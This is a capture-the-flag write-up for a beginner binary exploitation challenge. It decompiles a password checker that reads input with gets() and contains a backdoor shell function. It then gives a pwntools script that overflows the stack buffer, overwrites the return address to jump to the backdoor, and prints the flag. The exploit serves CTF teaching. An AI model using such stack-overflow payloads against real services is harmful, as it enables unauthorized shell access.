#### Challenge:

Charlie forgot his password to login into his Office portal. Help him to find it. (This challenge was written for the person on your team who has never solved a binary exploitation challenge before! Welcome to pwning.)

`nc pwn.chal.csaw.io 5000` [password_checker](./password_checker ":ignore")

---

#### Solution:

Opening the binary in `ghydra` we see that this is classic `stack overflow` using `gets`. We are conveniently given also function `backdoor` that runs the shell, So we just need to set the return pointer.

```c
void backdoor(void) {
  system("/bin/sh");
  return;
}

void password_checker(void) {
  undefined8 local_a8;
  undefined local_a0;
  char local_78 [48];
  char local_48 [60];
  int local_c;

  printf("Enter the password to get in: \n>");
  gets(local_48);
  strcpy(local_78,local_48);
  local_a8 = 0x64726f7773736170;
  local_a0 = 0;
  local_c = strcmp(local_78,(char *)&local_a8);
  if (local_c == 0) {
    printf("You got in!!!!");
  }
  else {
    printf("This is not the password");
  }
  return;
}

undefined8 main(EVP_PKEY_CTX *param_1) {
  init(param_1);
  password_checker();
  return 0;
}
```

```python
#!/usr/bin/env python

from pwn import *
from struct import *

for i in range(1, 2):
    print(i)

    host = "pwn.chal.csaw.io"
    port = 5000
    r = remote(host, port)

    # r = process('./password_checker')

    print(r.recvline().decode('utf-8').strip())


    payload = b'A'*(64) + b'B'*8 + pack("<Q", 0x0000000000401172)

    print(payload)

    r.sendline(payload)
    r.interactive()
    r.close()
```

---

<details><summary>FLAG:</summary>

```
flag{ch4r1i3_4ppr3ci4t35_y0u_f0r_y0ur_h31p}
```

</details>
<br/>
